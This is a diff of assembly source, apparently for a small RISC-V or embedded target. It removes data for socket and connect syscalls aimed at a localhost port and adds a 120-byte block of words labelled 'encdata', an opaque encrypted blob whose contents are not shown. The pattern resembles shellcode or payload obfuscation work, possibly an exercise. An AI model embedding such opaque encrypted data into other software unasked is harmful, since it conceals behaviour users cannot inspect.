@@ -27,10 +27,36 @@ infinite:
 	#sw s1, 28(s0);		# Write to GPIO 8
 	jal zero, infinite;
 
-.data
-socket_call:   .long 281
-connect_call:  .long 283
-
-/* all addresses are network byte-order (big-endian) */
-server_addr:            .long 0x0100007f ; localhost
-server_port:            .hword 0x0b1a
+.data;
+sizedata:  .word 0x78;
+encdata:
+encdata0:  .word 0x3c3385e5;
+encdata1:  .word 0x54c04fe5;
+encdata2:  .word 0x5448c4b8;
+encdata3:  .word 0x5a6e3338;
+encdata4:  .word 0xab86f85c;
+encdata5:  .word 0xaede10bc;
+encdata6:  .word 0xea3a5a76;
+encdata7:  .word 0xdae5fdf2;
+encdata8:  .word 0x9e23f267;
+encdata9:  .word 0x22dd3d18;
+encdata10:  .word 0xe8689576;
+encdata11:  .word 0xefefa946;
+encdata12:  .word 0x78861b2a;
+encdata13:  .word 0x4834979d;
+encdata14:  .word 0x38c18f22;
+encdata15:  .word 0x6d893a08;
+encdata16:  .word 0x53e34287;
+encdata17:  .word 0x5526141c;
+encdata18:  .word 0xbb8ab56;
+encdata19:  .word 0x6a56be8;
+encdata20:  .word 0x701ca74e;
+encdata21:  .word 0x8271cdcb;
+encdata22:  .word 0x7298aa9a;
+encdata23:  .word 0x434f078b;
+encdata24:  .word 0x3d06f3fd;
+encdata25:  .word 0xf329e935;
+encdata26:  .word 0xc0178037;
+encdata27:  .word 0x6a45b953;
+encdata28:  .word 0x975ab4c9;
+encdata29:  .word 0x42539e07;
